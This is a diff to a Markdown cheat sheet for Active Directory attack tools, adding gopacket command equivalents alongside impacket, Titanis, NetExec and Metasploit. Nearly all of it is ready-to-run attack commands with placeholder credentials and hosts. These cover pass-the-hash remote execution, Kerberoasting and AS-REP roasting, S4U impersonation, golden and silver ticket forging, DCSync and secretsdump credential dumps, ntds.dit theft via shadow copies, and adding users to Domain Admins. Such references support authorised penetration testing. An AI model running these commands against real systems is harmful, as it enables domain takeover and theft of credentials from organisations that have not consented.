@@ -89,24 +89,30 @@
 
 ## Auth Quick Reference
 
-| Scenario | impacket | Titanis | minikerberos URL | msldap URL | Metasploit | aiosmb URL |
-|---|---|---|---|---|---|---|
-| Password | `DOMAIN/user:Pass@host` | `-UserName user -UserDomain DOMAIN -Password Pass` | `kerberos+password://DOMAIN\user:Pass@kdc` | `ldap+ntlm-password://DOMAIN\user:Pass@dc` | `SMBDomain DOMAIN SMBUser user SMBPass Pass` | `smb+ntlm-password://DOMAIN\user:Pass@host` |
-| Pass-the-Hash | `-hashes :NTLM` | `-NtlmHash <NTLM>` | `kerberos+ntlm-nt://DOMAIN\user:NTLM@kdc` | `ldap+ntlm-nt://DOMAIN\user:NTLM@dc` | `SMBPass aad3b435b51404eeaad3b435b51404ee:NTLM` | `smb+ntlm-nt://DOMAIN\user:NTLM@host` |
-| AES key | `-aesKey <hex>` | `-AesKey <hex>` | `kerberos+aes://DOMAIN\user:hex@kdc` | `ldap+kerberos+aes://.../?dc=ip` | `AESKEY <hex>` | `smb+kerberos+aes://DOMAIN\user:hex@host/?dc=ip` |
-| RC4 key | via `-hashes` | `-NtlmHash` | `kerberos+rc4://DOMAIN\user:NTLM@kdc` | `ldap+kerberos+rc4://.../?dc=ip` | `NTHASH <NTLM>` | `smb+kerberos+rc4://DOMAIN\user:NTLM@host/?dc=ip` |
-| ccache | `KRB5CCNAME=file.ccache` | `-TicketCache file.ccache` | `kerberos+ccache://...?ccache=f.ccache` | `ldap+kerberos+ccache://.../?dc=ip&ccache=f.ccache` | `KrbUseCachedCredentials true` | `smb+kerberos+ccache://DOMAIN\user:@host/?dc=ip&ccache=f.ccache` |
-| kirbi ticket | convert first | `-Ticket file.kirbi` | `minikerberos-kirbi2ccache` first | convert first | `auxiliary/admin/kerberos/ticket_converter` | convert to ccache first |
-| PKINIT / PFX | certipy / gettgtpkinit | — | `kerberos+pfx://...?pfx=f.pfx&pfxpass=P` | `ldap+kerberos+pfx://.../?dc=ip&pfx=f.pfx` | — | `smb+kerberos+pfx://DOMAIN\user:@host/?dc=ip&pfx=f.pfx&pfxpass=P` |
-| NEGOEX / PFX | — | — | n/a | n/a | — | `smb+negoex-pfx://cert.pfx:certpass@host/` |
-| SOCKS5 | `proxychains` prefix | `-Socks5 host:port` | n/a | `?proxytype=socks5&proxyhost=...&proxyport=...` | `set Proxies socks5:127.0.0.1:1080` | `?proxyhost=127.0.0.1&proxyport=1080` |
-| SOCKS4 | n/a | n/a | n/a | n/a | n/a | `?proxytype=socks4&proxyhost=127.0.0.1&proxyport=1080` |
-| Encrypt RPC | n/a | `-EncryptRpc` | n/a | n/a | auto | n/a (SMB signing negotiated automatically) |
-| Backup semantics | n/a | `-BackupSemantics` (Reg) / `-UseBackupSemantics` (Smb2Client) | n/a | n/a | n/a | n/a |
-| Anonymous bind | limited | undocumented | n/a | `ldap://192.168.1.1` | n/a | n/a |
-| QUIC (Azure) | n/a | n/a | n/a | n/a | n/a | `smb+quic+ntlm-password://DOMAIN\user:Pass@host` |
+| Scenario | impacket | gopacket | Titanis | minikerberos URL | msldap URL | Metasploit | aiosmb URL |
+|---|---|---|---|---|---|---|---|
+| Password | `DOMAIN/user:Pass@host` | `DOMAIN.FQDN/user:Pass@host` | `-UserName user -UserDomain DOMAIN -Password Pass` | `kerberos+password://DOMAIN\user:Pass@kdc` | `ldap+ntlm-password://DOMAIN\user:Pass@dc` | `SMBDomain DOMAIN SMBUser user SMBPass Pass` | `smb+ntlm-password://DOMAIN\user:Pass@host` |
+| Pass-the-Hash | `-hashes :NTLM` | `-hashes :NTLM DOMAIN/user@host` | `-NtlmHash <NTLM>` | `kerberos+ntlm-nt://DOMAIN\user:NTLM@kdc` | `ldap+ntlm-nt://DOMAIN\user:NTLM@dc` | `SMBPass aad3b435b51404eeaad3b435b51404ee:NTLM` | `smb+ntlm-nt://DOMAIN\user:NTLM@host` |
+| AES key | `-aesKey <hex>` | `-aesKey <hex>` | `-AesKey <hex>` | `kerberos+aes://DOMAIN\user:hex@kdc` | `ldap+kerberos+aes://.../?dc=ip` | `AESKEY <hex>` | `smb+kerberos+aes://DOMAIN\user:hex@host/?dc=ip` |
+| RC4 key | via `-hashes` | via `-hashes :NTLM` | `-NtlmHash` | `kerberos+rc4://DOMAIN\user:NTLM@kdc` | `ldap+kerberos+rc4://.../?dc=ip` | `NTHASH <NTLM>` | `smb+kerberos+rc4://DOMAIN\user:NTLM@host/?dc=ip` |
+| ccache | `KRB5CCNAME=file.ccache` | `KRB5CCNAME=f.ccache -k -no-pass DOMAIN.FQDN/user@fqdn.host` | `-TicketCache file.ccache` | `kerberos+ccache://...?ccache=f.ccache` | `ldap+kerberos+ccache://.../?dc=ip&ccache=f.ccache` | `KrbUseCachedCredentials true` | `smb+kerberos+ccache://DOMAIN\user:@host/?dc=ip&ccache=f.ccache` |
+| kirbi ticket | convert first | `ticketConverter file.kirbi file.ccache` first | `-Ticket file.kirbi` | `minikerberos-kirbi2ccache` first | convert first | `auxiliary/admin/kerberos/ticket_converter` | convert to ccache first |
+| PKINIT / PFX | certipy / gettgtpkinit | — | — | `kerberos+pfx://...?pfx=f.pfx&pfxpass=P` | `ldap+kerberos+pfx://.../?dc=ip&pfx=f.pfx` | — | `smb+kerberos+pfx://DOMAIN\user:@host/?dc=ip&pfx=f.pfx&pfxpass=P` |
+| NEGOEX / PFX | — | — | — | n/a | n/a | — | `smb+negoex-pfx://cert.pfx:certpass@host/` |
+| SOCKS5 | `proxychains` prefix | `proxychains` prefix (native cgo; no GOFLAGS workaround needed) | `-Socks5 host:port` | n/a | `?proxytype=socks5&proxyhost=...&proxyport=...` | `set Proxies socks5:127.0.0.1:1080` | `?proxyhost=127.0.0.1&proxyport=1080` |
+| SOCKS4 | n/a | n/a | n/a | n/a | n/a | n/a | `?proxytype=socks4&proxyhost=127.0.0.1&proxyport=1080` |
+| Encrypt RPC | n/a | n/a | `-EncryptRpc` | n/a | n/a | auto | n/a (SMB signing negotiated automatically) |
+| Backup semantics | n/a | n/a | `-BackupSemantics` (Reg) / `-UseBackupSemantics` (Smb2Client) | n/a | n/a | n/a | n/a |
+| Anonymous bind | limited | — | undocumented | n/a | `ldap://192.168.1.1` | n/a | n/a |
+| QUIC (Azure) | n/a | n/a | n/a | n/a | n/a | n/a | `smb+quic+ntlm-password://DOMAIN\user:Pass@host` |
+| LDAP port | (direct LDAP) | `-port 389` required (default 445 breaks LDAP tools) | (direct LDAP) | (URL port) | (URL port) | — | — |
 
 > **⚠️ Titanis ccache note:** `-Tgt` currently rejects ccache files generated by impacket (`getTGT.py`) and similar tools. Root cause: impacket encodes the TGT service principal as **NT_PRINCIPAL** (name type 1); Titanis expects **NT_SERVICE_INSTANCE** (name type 2) and fails to recognise the ticket as a TGT. A fix is pending from the Titanis developer to relax this check. Until then, use `Kerb asreq -TicketCache` to obtain a Titanis-native TGT and pass it via `-Tgt`. Separately, `-TicketCache` silently provides no auth context for non-native ccache files — use `-Tgt` (with a Titanis-generated file) instead. For impacket/Metasploit ccache files, use `KRB5CCNAME` + `wmiexec.py -k` / `smbclient.py -k` directly.
+
+> **⚠️ gopacket Kerberos notes:**
+> - Must use the **FQDN domain** in the target string (e.g., `NORTH.SEVENKINGDOMS.LOCAL/user@host`). Short NetBIOS names (e.g., `NORTH`) cause a realm mismatch error when the DC returns the full realm in the TGS response.
+> - **All LDAP-based tools** require `-port 389` (plain LDAP) or `-port 636` (LDAPS). The default of 445 (LDAP-over-SMB named pipe) is not supported by most Windows DCs and produces `connection reset by peer`.
+> - proxychains works natively — gopacket links against libc via cgo so `LD_PRELOAD` hooks intercept connections normally. No `GOFLAGS` workaround required.
 
 ---
 
@@ -118,6 +124,9 @@
 # impacket
 wmiexec.py DOMAIN/jdoe:Password123@192.168.1.10 "whoami"
 
+# gopacket — password (interactive semi-shell)
+wmiexec DOMAIN.FQDN/jdoe:Password123@192.168.1.10
+
 # NetExec
 netexec smb 192.168.1.10 -u jdoe -p Password123 -x "whoami"
 
@@ -126,6 +135,9 @@ Wmi exec 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 "w
 
 # impacket — pass-the-hash
 wmiexec.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10 "ipconfig"
+
+# gopacket — pass-the-hash
+wmiexec -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10
 
 # NetExec — pass-the-hash
 netexec smb 192.168.1.10 -u jdoe -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 -x "ipconfig"
@@ -136,6 +148,10 @@ Wmi exec 192.168.1.10 -UserName jdoe -UserDomain DOMAIN \
 
 # impacket — Kerberos
 wmiexec.py -k -no-pass DOMAIN/jdoe@dc01.domain.local "hostname"
+
+# gopacket — Kerberos (must use FQDN domain; FQDN hostname as target)
+KRB5CCNAME=jdoe.ccache wmiexec -k -no-pass -dc-ip 192.168.1.1 \
+  DOMAIN.FQDN/jdoe@dc01.domain.local
 
 # Titanis — Kerberos
 # Use the short hostname as target (for Kerberos SPN + application protocol);
@@ -167,6 +183,16 @@ dcomexec.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10 "
 # impacket — explicit CLSID (default is MMC20.Application; ShellWindows or ShellBrowserWindow also work)
 dcomexec.py DOMAIN/jdoe:Password123@192.168.1.10 "whoami" -object ShellWindows
 dcomexec.py DOMAIN/jdoe:Password123@192.168.1.10 "whoami" -object ShellBrowserWindow
+
+# gopacket — password (interactive semi-shell; default object is ShellWindows)
+dcomexec DOMAIN/jdoe:Password123@192.168.1.10
+
+# gopacket — pass-the-hash with MMC20 object
+dcomexec -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 -object MMC20 DOMAIN/jdoe@192.168.1.10
+
+# gopacket — silent command execution (no interactive shell, output redirect required)
+dcomexec -object MMC20 -silentcommand DOMAIN/jdoe:Password123@192.168.1.10 \
+  'cmd /c whoami > C:\Windows\Temp\out.txt'
 
 # NetExec
 netexec smb 192.168.1.10 -u jdoe -p Password123 -x "whoami" --exec-method dcomexec
@@ -210,8 +236,20 @@ Reg list 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
 # impacket — smbexec (interactive semi-shell; works against member servers)
 smbexec.py DOMAIN/jdoe:Password123@192.168.1.10
 
+# gopacket — smbexec (interactive semi-shell; runs as NT AUTHORITY\SYSTEM)
+smbexec DOMAIN/jdoe:Password123@192.168.1.10
+
+# gopacket — smbexec pass-the-hash
+smbexec -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10
+
 # impacket — psexec
 psexec.py DOMAIN/jdoe:Password123@192.168.1.10 cmd.exe
+
+# gopacket — psexec (uploads service binary, runs as NT AUTHORITY\SYSTEM)
+psexec DOMAIN/jdoe:Password123@192.168.1.10
+
+# gopacket — psexec pass-the-hash
+psexec -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10
 
 # Metasploit — password
 msf6 > use exploit/windows/smb/psexec
@@ -254,6 +292,11 @@ Smb2Client rm  \\192.168.1.10\C$\Windows\Temp\out.txt \
 # impacket — true MS-TSCH (creates, runs, and cleans up automatically)
 atexec.py DOMAIN/jdoe:Password123@192.168.1.10 "whoami > C:\Windows\Temp\out.txt"
 
+# gopacket — MS-TSCH scheduled task exec (runs as NT AUTHORITY\SYSTEM)
+atexec DOMAIN/jdoe:Password123@192.168.1.10 whoami
+# gopacket — pass-the-hash
+atexec -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10 whoami
+
 # impacket — pass-the-hash
 atexec.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10 \
   "whoami > C:\Windows\Temp\out.txt"
@@ -295,6 +338,9 @@ done < hosts.txt
 # impacket — password
 getTGT.py DOMAIN/jdoe:Password123 -dc-ip 192.168.1.1
 
+# gopacket — password (target format: DOMAIN.FQDN/user:Pass@dc-ip)
+getTGT -dc-ip 192.168.1.1 DOMAIN.FQDN/jdoe:Password123@192.168.1.1
+
 # minikerberos — password
 minikerberos-getTGT "kerberos+password://DOMAIN\jdoe:Password123@192.168.1.1" --ccache jdoe.ccache
 
@@ -309,6 +355,9 @@ msf6 auxiliary(get_ticket) > run rhosts=192.168.1.1 domain=DOMAIN.LOCAL user=jdo
 
 # impacket — NTLM hash
 getTGT.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe -dc-ip 192.168.1.1
+
+# gopacket — NTLM hash
+getTGT -dc-ip 192.168.1.1 -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN.FQDN/jdoe@192.168.1.1
 
 # minikerberos — NTLM hash
 minikerberos-getTGT "kerberos+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.1" --ccache jdoe.ccache
@@ -365,6 +414,12 @@ minikerberos-getTGS \
 # Titanis
 Kerb tgsreq -Kdc 192.168.1.1 -Tgt jdoe-tgt.kirbi \
   cifs/fileserver.domain.local -OutputFileName jdoe-fileserver.kirbi
+
+# gopacket — password
+getST -dc-ip 192.168.1.1 -spn cifs/fileserver.domain.local DOMAIN.FQDN/jdoe:Password123@192.168.1.1
+# gopacket — pass-the-hash
+getST -dc-ip 192.168.1.1 -spn cifs/fileserver.domain.local \
+  -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN.FQDN/jdoe@192.168.1.1
 ```
 
 [↑ Back to Index](#index)
@@ -396,6 +451,13 @@ minikerberos-getS4U2proxy \
 Kerb tgsreq -Kdc 192.168.1.1 -Tgt svc-tgt.kirbi \
   -S4UserName Administrator@DOMAIN cifs/target.domain.local \
   -OutputFileName admin-target.kirbi
+
+# gopacket — S4U2self + S4U2proxy (combined)
+getST -dc-ip 192.168.1.1 -spn cifs/target.domain.local -impersonate Administrator \
+  DOMAIN.FQDN/svc:Password123@192.168.1.1
+# gopacket — pass-the-hash
+getST -dc-ip 192.168.1.1 -spn cifs/target.domain.local -impersonate Administrator \
+  -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN.FQDN/svc@192.168.1.1
 ```
 
 [↑ Back to Index](#index)
@@ -457,6 +519,12 @@ while IFS= read -r spn; do
 done < spns.txt
 Kerb select -From roast_*.kirbi -Into kerberoast-all.ccache
 minikerberos-ccacheroast kerberoast-all.ccache
+
+# gopacket — password (requires -port 389; default 445 breaks LDAP enumeration)
+GetUserSPNs -dc-ip 192.168.1.1 -port 389 -request DOMAIN.FQDN/jdoe:Password123@192.168.1.1
+# gopacket — pass-the-hash
+GetUserSPNs -dc-ip 192.168.1.1 -port 389 -request \
+  -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN.FQDN/jdoe@192.168.1.1
 ```
 
 [↑ Back to Index](#index)
@@ -507,6 +575,14 @@ while IFS= read -r user; do
     -Kdc 192.168.1.1 -EncTypes Rc4Hmac \
     -OutputFileName "asrep_${user}.kirbi" 2>/dev/null
 done < <(awk '/sAMAccountName:/{print $2}' asrep_targets.txt)
+
+# gopacket — authenticated LDAP enumeration + roast (requires -port 389)
+GetNPUsers -dc-ip 192.168.1.1 -port 389 DOMAIN.FQDN/jdoe:Password123@192.168.1.1
+# gopacket — pass-the-hash
+GetNPUsers -dc-ip 192.168.1.1 -port 389 \
+  -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN.FQDN/jdoe@192.168.1.1
+# gopacket — unauthenticated with user list
+GetNPUsers -dc-ip 192.168.1.1 -no-pass -usersfile users.txt DOMAIN.FQDN/@192.168.1.1
 ```
 
 [↑ Back to Index](#index)
@@ -624,6 +700,9 @@ minikerberos-renewTGT "kerberos+ccache://DOMAIN\jdoe:@192.168.1.1?ccache=jdoe.cc
 
 # Titanis
 Kerb renew -Ticket jdoe-tgt.kirbi -OutputFileName jdoe-tgt-renewed.kirbi
+
+# gopacket — renew TGT (KRB5CCNAME must point to an existing ccache)
+KRB5CCNAME=jdoe.ccache getST -renew -spn krbtgt/DOMAIN.LOCAL -dc-ip 192.168.1.1 -k -no-pass DOMAIN/jdoe@192.168.1.1
 ```
 
 [↑ Back to Index](#index)
@@ -654,6 +733,13 @@ minikerberos-ccacheedit delete jdoe.ccache <credential-index>
 # Titanis — merge multiple files
 Kerb select -From jdoe.ccache
 Kerb select -From jdoe*.kirbi -Into all-jdoe.ccache
+
+# gopacket — ccache ↔ kirbi conversion
+ticketConverter jdoe.ccache jdoe.kirbi
+ticketConverter jdoe.kirbi jdoe.ccache
+# gopacket — inspect ticket contents
+describeTicket /path/to/jdoe.ccache
+describeTicket /path/to/jdoe.kirbi
 ```
 
 [↑ Back to Index](#index)
@@ -680,6 +766,13 @@ bloodyAD -H 192.168.1.1 -d DOMAIN -u admin -p :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 
 
 # Titanis — admin sets another user's password
 Kerb setpw -UserName admin -UserDomain DOMAIN -Kdc 192.168.1.1 -Password AdminPass jdoe@DOMAIN NewPass
+
+# gopacket — user changes own password (kpasswd)
+changepasswd -protocol kpasswd -newpass NewPass DOMAIN/jdoe:OldPass@192.168.1.1
+# gopacket — admin resets another user's password (SAMR over SMB)
+changepasswd -reset -altuser DOMAIN/admin -altpass AdminPass -newpass NewPass DOMAIN/jdoe@192.168.1.1
+# gopacket — admin reset via pass-the-hash
+changepasswd -reset -altuser DOMAIN/admin -althash A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 -newpass NewPass DOMAIN/jdoe@192.168.1.1
 ```
 
 [↑ Back to Index](#index)
@@ -740,6 +833,17 @@ smbclient.py -k -no-pass DOMAIN/Administrator@fileserver.domain.local
 #   -TicketCache Administrator.ccache "whoami"
 # Smb2Client ls \\fileserver.domain.local\C$ -UserName Administrator -UserDomain DOMAIN \
 #   -TicketCache Administrator.ccache
+
+# gopacket — golden ticket (requires krbtgt NT hash and domain SID)
+ticketer -nthash <krbtgt_ntlm> -domain-sid S-1-5-21-... \
+  -domain DOMAIN.LOCAL Administrator
+export KRB5CCNAME=Administrator.ccache
+wmiexec -k -no-pass DOMAIN.FQDN/Administrator@dc01.domain.local "whoami"
+# gopacket — silver ticket (service account NT hash)
+ticketer -nthash <service_ntlm> -domain-sid S-1-5-21-... \
+  -domain DOMAIN.LOCAL -spn cifs/fileserver.domain.local Administrator
+export KRB5CCNAME=Administrator.ccache
+smbclient -k -no-pass DOMAIN.FQDN/Administrator@fileserver.domain.local
 ```
 
 [↑ Back to Index](#index)
@@ -771,6 +875,11 @@ asmbshareenum "smb+kerberos+ccache://DOMAIN\jdoe:@192.168.1.10/?dc=192.168.1.1&c
 
 # Titanis
 Smb2Client enumshares \\192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123
+
+# gopacket — password
+smbclient -shares DOMAIN/jdoe:Password123@192.168.1.10
+# gopacket — pass-the-hash
+smbclient -shares -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10
 ```
 
 [↑ Back to Index](#index)
@@ -795,6 +904,11 @@ asmbclient "smb+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1
 # Titanis
 Smb2Client ls \\192.168.1.10\Share -UserName jdoe -UserDomain DOMAIN -Password Password123
 Smb2Client ls \\192.168.1.10\C$   -UserName jdoe -UserDomain DOMAIN -Password Password123
+
+# gopacket — interactive SMB shell (ls, cd, get, put)
+smbclient DOMAIN/jdoe:Password123@192.168.1.10
+# gopacket — pass-the-hash
+smbclient -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10
 ```
 
 [↑ Back to Index](#index)
@@ -963,6 +1077,11 @@ asmbclient "smb+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"
 # Titanis
 Smb2Client enumopenfiles \\192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123
 Smb2Client enumsessions  \\192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123
+
+# gopacket — enumerate sessions and open files
+netview DOMAIN/jdoe:Password123@192.168.1.10
+# gopacket — pass-the-hash
+netview -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10
 ```
 
 [↑ Back to Index](#index)
@@ -988,28 +1107,35 @@ Smb2Client touch \\192.168.1.10\C$\Windows\Temp\payload.exe \
 ### VSS Snapshot Enumeration
 
 ```bash
-# impacket — interactive shell command
+# impacket — connect, switch to share, then enumerate snapshots
 smbclient.py DOMAIN/jdoe:Password123@192.168.1.10
-# list_snapshots C$
+# smb: \> use c$
+# smb: \c$\> list_snapshots
+# @GMT-2026.03.15-22.24.19
 
 # smbclient-ng
 smbclient-ng --host 192.168.1.10 -u jdoe -p Password123 --domain DOMAIN snapshots C$
 
 # Titanis
 Smb2Client enumsnapshots \\192.168.1.10\C$ -UserName jdoe -UserDomain DOMAIN -Password Password123
+
+# gopacket — ⚠️ list_snapshots not implemented in gopacket smbclient (feature request pending)
+# Use impacket smbclient.py or native smbclient for this step
 ```
 
 > **@GMT snapshot path access:** `@GMT-...` is not a real directory — Windows SRV.SYS intercepts the token in the SMB2 CREATE path and redirects to the VSS snapshot. Tools that navigate paths component-by-component (including `Smb2Client get`) will get `STATUS_OBJECT_PATH_NOT_FOUND`. Use smbclient.py or native smbclient, which send the full path in a single CREATE request:
 >
 > ```bash
-> # impacket smbclient.py — list_snapshots then get
+> # impacket smbclient.py — enumerate then pull via snapshot path
 > smbclient.py DOMAIN/jdoe:Password123@192.168.1.10
-> # list_snapshots C$
-> # get @GMT-2024.01.01-00.00.00\Windows\NTDS\ntds.dit ntds.dit
+> # smb: \> use c$
+> # smb: \c$\> list_snapshots
+> # @GMT-2026.03.15-22.24.19
+> # smb: \c$\> get @GMT-2026.03.15-22.24.19\Windows\NTDS\ntds.dit ntds.dit
 >
 > # native smbclient (Samba)
 > smbclient //192.168.1.10/C$ -U 'DOMAIN\jdoe%Password123' \
->   -c 'get @GMT-2024.01.01-00.00.00\Windows\NTDS\ntds.dit ntds.dit'
+>   -c 'get @GMT-2026.03.15-22.24.19\Windows\NTDS\ntds.dit ntds.dit'
 > ```
 
 [↑ Back to Index](#index)
@@ -1203,6 +1329,11 @@ pypykatz smb secretsdump "smb2+ntlm-password://DOMAIN\jdoe:Password123@192.168.1
 # Titanis — requires -BackupSemantics for both; without it → ACCESS_DENIED
 Reg dumpsam        192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 -BackupSemantics
 Reg dumplsasecrets 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 -BackupSemantics
+
+# gopacket — SAM + LSA + DCSync (password)
+secretsdump DOMAIN/jdoe:Password123@192.168.1.10
+# gopacket — pass-the-hash
+secretsdump -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10
 ```
 
 [↑ Back to Index](#index)
@@ -1535,6 +1666,13 @@ netexec smb 192.168.1.1 -u Administrator -p Password123 --ntds --user krbtgt
 
 # NetExec — pass-the-hash
 netexec smb 192.168.1.1 -u Administrator -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 --ntds
+
+# gopacket — DCSync full NTLM dump
+secretsdump -just-dc-ntlm DOMAIN/Administrator:Password123@192.168.1.1
+# gopacket — DCSync pass-the-hash
+secretsdump -just-dc-ntlm -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/Administrator@192.168.1.1
+# gopacket — DCSync single user
+secretsdump -just-dc-user DOMAIN/krbtgt DOMAIN/Administrator:Password123@192.168.1.1
 ```
 
 [↑ Back to Index](#index)
@@ -1565,6 +1703,11 @@ msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
 
 # Titanis
 Sam enumusers 192.168.1.10 -UserName jdoe -Password Password123
+
+# gopacket — SAMR user enumeration
+samrdump DOMAIN/jdoe:Password123@192.168.1.10
+# gopacket — pass-the-hash
+samrdump -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10
 ```
 
 [↑ Back to Index](#index)
@@ -1606,6 +1749,19 @@ bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 get search \
 # Titanis
 Sam enumgroups  192.168.1.10 -UserName jdoe -Password Password123
 Sam enumaliases 192.168.1.10 -UserName jdoe -Password Password123
+
+# gopacket — enumerate domain groups
+net DOMAIN/jdoe:Password123@192.168.1.10 group
+# gopacket — enumerate local aliases
+net DOMAIN/jdoe:Password123@192.168.1.10 localgroup
+# gopacket — list members of a specific group
+net DOMAIN/jdoe:Password123@192.168.1.10 group -name "Domain Admins"
+net DOMAIN/jdoe:Password123@192.168.1.10 localgroup -name Administrators
+# gopacket — add/remove user from a domain group
+net DOMAIN/admin:Password123@192.168.1.10 group -name "Domain Admins" -join newuser
+net DOMAIN/admin:Password123@192.168.1.10 group -name "Domain Admins" -unjoin newuser
+# gopacket — pass-the-hash
+net -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10 group
 ```
 
 [↑ Back to Index](#index)
@@ -1630,6 +1786,13 @@ Lsa lookupsid 192.168.1.10 -UserName jdoe -Password Password123 \
 
 # Titanis — name to SID
 Lsa lookupname 192.168.1.10 -UserName jdoe -Password Password123 Administrator jdoe
+
+# gopacket — RID brute force (resolves SIDs, dumps domain SID + usernames)
+lookupsid DOMAIN/jdoe:Password123@192.168.1.10
+# gopacket — pass-the-hash
+lookupsid -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10
+# gopacket — null session (if allowed)
+lookupsid DOMAIN/@192.168.1.10
 ```
 
 [↑ Back to Index](#index)
@@ -1645,6 +1808,13 @@ rpcmap.py ncacn_ip_tcp:192.168.1.10
 
 # Titanis
 Epm lsep 192.168.1.10
+
+# gopacket — RPC endpoint mapper dump (password)
+rpcdump DOMAIN/jdoe:Password123@192.168.1.10
+# gopacket — pass-the-hash
+rpcdump -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10
+# gopacket — rpcmap (unauthenticated TCP endpoint enumeration)
+rpcmap ncacn_ip_tcp:192.168.1.10
 ```
 
 [↑ Back to Index](#index)
@@ -1673,6 +1843,12 @@ Wmi query 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   "SELECT * FROM Win32_Process"
 Wmi query 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   -OutputFields Caption,ProcessId,ParentProcessId "SELECT * FROM Win32_Process"
+
+# gopacket — WQL query (password)
+wmiquery -query "SELECT * FROM Win32_Process" DOMAIN/jdoe:Password123@192.168.1.10
+# gopacket — pass-the-hash
+wmiquery -query "SELECT * FROM Win32_Process" \
+  -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10
 ```
 
 [↑ Back to Index](#index)
@@ -1716,6 +1892,13 @@ reg.py DOMAIN/jdoe:Password123@192.168.1.10 query \
 Reg get 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   HKLM/SYSTEM/CurrentControlSet/Control/Lsa LsaCfgFlags
 
+# gopacket — query a key
+reg query -keyName HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion DOMAIN/jdoe:Password123@192.168.1.10
+# gopacket — read a value
+reg query -keyName HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa -v LsaCfgFlags DOMAIN/jdoe:Password123@192.168.1.10
+# gopacket — pass-the-hash
+reg query -keyName HKLM\\SOFTWARE -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10
+
 # impacket — set a value
 reg.py DOMAIN/jdoe:Password123@192.168.1.10 add \
   -keyName HKCU\\Software\\Test -v TestValue -vt REG_SZ -vd "TestData"
@@ -1723,6 +1906,14 @@ reg.py DOMAIN/jdoe:Password123@192.168.1.10 add \
 # Titanis — set a value
 Reg set 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   HKCU/Software/Test sz:TestValue=TestData
+
+# gopacket — set a value
+reg add -keyName HKCU\\Software\\Test -v TestValue -vt REG_SZ -vd TestData DOMAIN/jdoe:Password123@192.168.1.10
+# gopacket — delete a value
+reg delete -keyName HKCU\\Software\\Test -v TestValue DOMAIN/jdoe:Password123@192.168.1.10
+# gopacket — pass-the-hash
+reg add -keyName HKCU\\Software\\Test -v TestValue -vt REG_SZ -vd TestData \
+  -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10
 ```
 
 [↑ Back to Index](#index)
@@ -1775,6 +1966,16 @@ Scm stop  192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 S
 Scm create 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 mysvc \
   "C:\Windows\System32\cmd.exe"
 Scm delete 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 mysvc
+
+# gopacket — list all services
+services DOMAIN/jdoe:Password123@192.168.1.10 list
+# gopacket — pass-the-hash
